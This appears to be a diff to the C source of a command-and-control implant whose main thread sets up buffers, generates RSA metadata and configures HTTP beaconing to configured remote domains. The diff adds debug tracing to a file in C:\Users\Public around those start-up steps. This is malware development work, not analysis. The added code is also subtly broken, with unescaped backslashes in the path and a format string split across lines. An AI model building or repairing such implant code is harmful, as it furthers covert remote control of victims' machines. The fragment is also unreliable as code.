@@ -76,13 +76,22 @@ void BeaconErrorNA(int error) {
 	BeaconPrintf(CALLBACK_ERROR, "operation failed (no args)");
 }
 
+
+static void OBTRACE(const char* what) {
+	FILE* f = fopen("C:\Users\Public\ob_trace.txt", "a");
+	if (f) { fprintf(f, "[%lu] %s
+", (unsigned long)GetTickCount(), what); fclose(f); }
+}
+
 static DWORD WINAPI ObMain(LPVOID unused) {
 	char* data = (char*)malloc(OB_MAX_GET);
 	if (data == NULL)
 		BeaconInterrupt();
 	gPostBuffer = (char*)malloc(OB_MAX_POST);
 
+	OBTRACE("main: buffers ready");
 	NetworkInit();
+	OBTRACE("main: NetworkInit done");
 
 	char domains[256];
 	strncpy(domains, S_DOMAINS, sizeof(domains) - 1);
@@ -90,10 +99,14 @@ static DWORD WINAPI ObMain(LPVOID unused) {
 	char* saveptr = NULL;
 	char* host = strtok_s(domains, ",", &saveptr);
 
+	OBTRACE("main: before MetadataGenerate");
 	MetadataGenerate(NULL, 128);
+	OBTRACE("main: MetadataGenerate done (RSA ok)");
 
+	OBTRACE("main: before ConfigureHttp");
 	if (host != NULL)
 		NetworkConfigureHttp(host, S_PORT_HTTP, OB_AGENT);
+	OBTRACE("main: ConfigureHttp done");
 
 	STRATEGY strategy = { 0, 0, 0 };
 
